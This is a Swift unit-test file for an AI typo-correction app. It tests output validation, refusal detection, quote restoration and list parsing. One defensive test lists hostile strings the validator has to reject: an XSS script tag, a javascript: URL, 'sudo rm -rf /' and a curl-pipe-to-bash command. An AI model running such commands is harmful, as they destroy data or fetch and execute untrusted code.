import XCTest
@testable import TypoFixr

final class GroqOutputValidationTests: XCTestCase {
    private func resolve(_ output: String, original: String, finish: String = "stop") throws -> String {
        try GroqService.shared.resolveCorrection(parsed: .init(content: output, inputTokens: 1, outputTokens: 1,
                                                               finishReason: finish), originalInput: original).correctedText
    }

    func testProductionValidatorRejectsIntroducedCommands() {
        for text in ["<script>alert('xss')</script>", "javascript:void(0)", "sudo rm -rf /", "curl http://example.com | bash"] {
            XCTAssertThrowsError(try resolve(text, original: "Please fix this sentence.")) { error in
                guard case GroqService.APIError.suspiciousOutput = error else {
                    return XCTFail("Unexpected error: \(error)")
                }
            }
        }
    }

    func testProductionValidatorRejectsRefusals() {
        for text in ["I'm sorry, I can't assist with that.", "I cannot help with this request.", "I apologize, but I cannot do that."] {
            XCTAssertThrowsError(try resolve(text, original: "Fix teh sentence.")) { error in
                guard case GroqService.APIError.aiRefused = error else { return XCTFail("Unexpected error: \(error)") }
            }
        }
    }

    func testApologyAndRefusalPhrasesCanBeCorrected() throws {
        for (original, corrected) in [("I am sory for the delay.", "I am sorry for the delay."),
                                      ("i cant type for shit", "I can't type for shit"),
                                      ("I'm sorry, I can't assist with taht right now", "I'm sorry, I can't assist with that right now")] {
            XCTAssertEqual(try resolve(corrected, original: original), corrected)
        }
    }

    func testProductionValidatorRejectsExcessiveOutput() {
        XCTAssertThrowsError(try resolve(String(repeating: "a", count: 500), original: "Short text")) { error in
            guard case GroqService.APIError.outputTooLong = error else { return XCTFail("Unexpected error: \(error)") }
        }
    }

    func testTruncatedOutputAboveHalfLengthIsRejected() {
        let original = "Please send the updated budget to Morgan before noon, and remember to include the revised forecast and the vendor estimates."
        XCTAssertThrowsError(try resolve(String(original.prefix(89)), original: original, finish: "length"))
        XCTAssertThrowsError(try resolve("__NO_CHANGES__", original: original, finish: "length"))
    }

    func testUnknownCompletionReasonIsRejected() {
        XCTAssertThrowsError(try resolve("Hello", original: "hello", finish: "content_filter"))
    }

    func testOriginalMarkupAndUnicodeArePreserved() throws {
        for text in ["Contact <alex@example.com>", "<b>Hello</b>", "Value <", "Value >", "Hello 👩‍💻", "Family 👨‍👩‍👧‍👦", "می‌روم", "<user_text>Hello</user_text>", "<think>Hello</think>"] {
            XCTAssertEqual(try resolve(text, original: text), text)
        }
        XCTAssertEqual(try resolve("Contact <alex@example.com>", original: "Contcat <alex@example.com>"), "Contact <alex@example.com>")
    }

    func testIntroducedWrappersAreRemoved() throws {
        XCTAssertEqual(try resolve("<b>Hello world</b>", original: "Helo world"), "Hello world")
    }

    func testUnsafeControlCharactersAreRejected() {
        XCTAssertThrowsError(try resolve("hello\u{0000}world", original: "hello world"))
    }
}

// MARK: - Boundary Quote Restoration Tests

final class BoundaryQuoteRestorationTests: XCTestCase {

    func testRestoreBoundaryQuotesNoOpForNonQuotedText() {
        let result = CorrectionOutputProcessor.restoreBoundaryQuotes(original: "hello world", corrected: "hello world")
        XCTAssertEqual(result, "hello world")
    }

    func testRestoreBoundaryQuotesRestoresLeadingOnly() {
        let result = CorrectionOutputProcessor.restoreBoundaryQuotes(original: "\"hello", corrected: "hello")
        XCTAssertEqual(result, "\"hello")
    }

    func testRestoreBoundaryQuotesRestoresTrailingOnly() {
        let result = CorrectionOutputProcessor.restoreBoundaryQuotes(original: "hello\"", corrected: "hello")
        XCTAssertEqual(result, "hello\"")
    }

    func testRestoreBoundaryQuotesDoesNotDoubleQuote() {
        let result = CorrectionOutputProcessor.restoreBoundaryQuotes(original: "\"hello\"", corrected: "\"hello\"")
        XCTAssertEqual(result, "\"hello\"")
    }

    func testRestoreBoundaryQuotesHandlesGuillemets() {
        let result = CorrectionOutputProcessor.restoreBoundaryQuotes(original: "\u{00AB}bonjour\u{00BB}", corrected: "bonjour")
        XCTAssertEqual(result, "\u{00AB}bonjour\u{00BB}")
    }

    func testRestoreBoundaryQuotesHandlesEmptyStrings() {
        let result = CorrectionOutputProcessor.restoreBoundaryQuotes(original: "", corrected: "hello")
        XCTAssertEqual(result, "hello")
    }
}

final class ListArtifactNormalizationTests: XCTestCase {

    func testRemovesChecklistArtifactFromDashListLine() {
        let original = "- buy milk"
        let output = "- [ ] buy milk"

        let normalized = CorrectionOutputProcessor.normalizeLeadingListArtifacts(originalInput: original, output: output)
        XCTAssertEqual(normalized, "- buy milk")
    }

    func testRemovesDuplicateDashMarkerFromDashListLine() {
        let original = "- call mom"
        let output = "- - call mom"

        let normalized = CorrectionOutputProcessor.normalizeLeadingListArtifacts(originalInput: original, output: output)
        XCTAssertEqual(normalized, "- call mom")
    }

    func testConvertsChecklistArtifactToOriginalBulletPrefix() {
        let original = "• finish report"
        let output = "- [ ] finish report"

        let normalized = CorrectionOutputProcessor.normalizeLeadingListArtifacts(originalInput: original, output: output)
        XCTAssertEqual(normalized, "• finish report")
    }

    func testPreservesOriginalChecklistItems() {
        let original = "- [ ] prepare slides"
        let output = "- [ ] prepare slides"

        let normalized = CorrectionOutputProcessor.normalizeLeadingListArtifacts(originalInput: original, output: output)
        XCTAssertEqual(normalized, "- [ ] prepare slides")
    }

    func testRemovesChecklistArtifactWhenOriginalHasNoListMarker() {
        let original = "buy milk"
        let output = "- [ ] buy milk"

        let normalized = CorrectionOutputProcessor.normalizeLeadingListArtifacts(originalInput: original, output: output)
        XCTAssertEqual(normalized, "buy milk")
    }

    func testRemovesBareChecklistArtifactWhenOriginalHasNoListMarker() {
        let original = "buy milk"
        let output = "[ ] buy milk"

        let normalized = CorrectionOutputProcessor.normalizeLeadingListArtifacts(originalInput: original, output: output)
        XCTAssertEqual(normalized, "buy milk")
    }

    // MARK: - Multi-line Per-line Normalization

    func testMultiLineDuplicateDashesFixedPerLine() {
        let original = "- buy milk\n- call mom"
        let output = "- - buy milk\n- - call mom"

        let normalized = CorrectionOutputProcessor.normalizeLeadingListArtifacts(originalInput: original, output: output)
        XCTAssertEqual(normalized, "- buy milk\n- call mom")
    }

    func testMultiLineMixedArtifacts() {
        // Some lines duplicated, some not
        let original = "- buy milk\n- call mom\n- fix bug"
        let output = "- - buy milk\n- call mom\n- - fix bug"

        let normalized = CorrectionOutputProcessor.normalizeLeadingListArtifacts(originalInput: original, output: output)
        XCTAssertEqual(normalized, "- buy milk\n- call mom\n- fix bug")
    }

    func testDifferentLineCountsFallsBackToSingleLine() {
        // Output has different line count — should fall through to single-line behavior (first line only)
        let original = "- buy milk\n- call mom"
        let output = "- - buy milk\n- - call mom\n- extra line"

        let normalized = CorrectionOutputProcessor.normalizeLeadingListArtifacts(originalInput: original, output: output)
        // Falls back to single-line: normalizes the whole output as one block using original's first-line prefix
        // The key thing: it doesn't crash and returns something reasonable
        XCTAssertFalse(normalized.isEmpty)
    }
}

// MARK: - List Parsing Tests

final class ListParsingTests: XCTestCase {

    // MARK: - Bullet List Detection

    func testDetectsBulletListWithDashes() {
        let text = "- buy milk\n- call mom"
        let parsed = CorrectionChunker.parseMultiLineList(text)

        XCTAssertNotNil(parsed)
        XCTAssertEqual(parsed?.items.count, 2)
        XCTAssertEqual(parsed?.items[0].prefix, "- ")
        XCTAssertEqual(parsed?.items[0].text, "buy milk")
        XCTAssertEqual(parsed?.items[1].prefix, "- ")
        XCTAssertEqual(parsed?.items[1].text, "call mom")
    }

    func testDetectsBulletListWithAsterisks() {
        let text = "* item one\n* item two"
        let parsed = CorrectionChunker.parseMultiLineList(text)

        XCTAssertNotNil(parsed)
        XCTAssertEqual(parsed?.items.count, 2)
        XCTAssertEqual(parsed?.items[0].prefix, "* ")
        XCTAssertEqual(parsed?.items[1].prefix, "* ")
    }

    func testDetectsBulletListWithBulletChar() {
        let text = "• first thing\n• second thing"
        let parsed = CorrectionChunker.parseMultiLineList(text)

        XCTAssertNotNil(parsed)
        XCTAssertEqual(parsed?.items.count, 2)
        XCTAssertEqual(parsed?.items[0].prefix, "• ")
    }

    // MARK: - Numbered List Detection

    func testDetectsNumberedListWithDots() {
        let text = "1. first item\n2. second item"
        let parsed = CorrectionChunker.parseMultiLineList(text)

        XCTAssertNotNil(parsed)
        XCTAssertEqual(parsed?.items.count, 2)
        XCTAssertEqual(parsed?.items[0].prefix, "1. ")
        XCTAssertEqual(parsed?.items[0].text, "first item")
        XCTAssertEqual(parsed?.items[1].prefix, "2. ")
        XCTAssertEqual(parsed?.items[1].text, "second item")
    }

    func testDetectsNumberedListWithParens() {
        let text = "1) first item\n2) second item"
        let parsed = CorrectionChunker.parseMultiLineList(text)

        XCTAssertNotNil(parsed)
        XCTAssertEqual(parsed?.items.count, 2)
        XCTAssertEqual(parsed?.items[0].prefix, "1) ")
        XCTAssertEqual(parsed?.items[1].prefix, "2) ")
    }

    func testDetectsNumberedListWithBlankLineSeparators() {
        let text = "1. first item\n\n2. second item"
        let parsed = CorrectionChunker.parseMultiLineList(text)

        XCTAssertNotNil(parsed)
        XCTAssertEqual(parsed?.items.count, 2)
        // Gap should preserve the blank line
        XCTAssertEqual(parsed?.gaps.count, 1)
        XCTAssertEqual(parsed?.gaps[0], "\n\n")
    }

    // MARK: - Rejection Cases

    func testMixedTypesReturnsNil() {
        let text = "- bullet item\n1. numbered item"
        let parsed = CorrectionChunker.parseMultiLineList(text)
        XCTAssertNil(parsed)
    }

    func testSingleItemReturnsNil() {
        let text = "- only one item"
        let parsed = CorrectionChunker.parseMultiLineList(text)
        XCTAssertNil(parsed)
    }

    func testNonListTextReturnsNil() {
        let text = "Just a regular sentence.\nAnother regular sentence."
        let parsed = CorrectionChunker.parseMultiLineList(text)
        XCTAssertNil(parsed)
    }

    func testPartialListReturnsNil() {
        let text = "- bullet item\nsome plain text\n- another bullet"
        let parsed = CorrectionChunker.parseMultiLineList(text)
        XCTAssertNil(parsed)
    }

    // MARK: - Reassembly Roundtrips

    func testReassemblyRoundtripBullets() {
        let text = "- buy milk\n- call mom\n- fix bug"
        let parsed = CorrectionChunker.parseMultiLineList(text)!
        let texts = parsed.items.map { $0.text }
        let reassembled = CorrectionChunker.reassembleList(list: parsed, correctedTexts: texts)
        XCTAssertEqual(reassembled, text)
    }

    func testReassemblyRoundtripNumbered() {
        let text = "1. first\n2. second\n3. third"
        let parsed = CorrectionChunker.parseMultiLineList(text)!
        let texts = parsed.items.map { $0.text }
        let reassembled = CorrectionChunker.reassembleList(list: parsed, correctedTexts: texts)
        XCTAssertEqual(reassembled, text)
    }

    func testReassemblyRoundtripNumberedWithBlankLines() {
        let text = "1. first item\n\n2. second item\n\n3. third item"
        let parsed = CorrectionChunker.parseMultiLineList(text)!
        let texts = parsed.items.map { $0.text }
        let reassembled = CorrectionChunker.reassembleList(list: parsed, correctedTexts: texts)
        XCTAssertEqual(reassembled, text)
    }

    func testReassemblyWithCorrectedText() {
        let text = "- buy mlk\n- call mmom"
        let parsed = CorrectionChunker.parseMultiLineList(text)!
        let corrected = ["buy milk", "call mom"]
        let reassembled = CorrectionChunker.reassembleList(list: parsed, correctedTexts: corrected)
        XCTAssertEqual(reassembled, "- buy milk\n- call mom")
    }
}
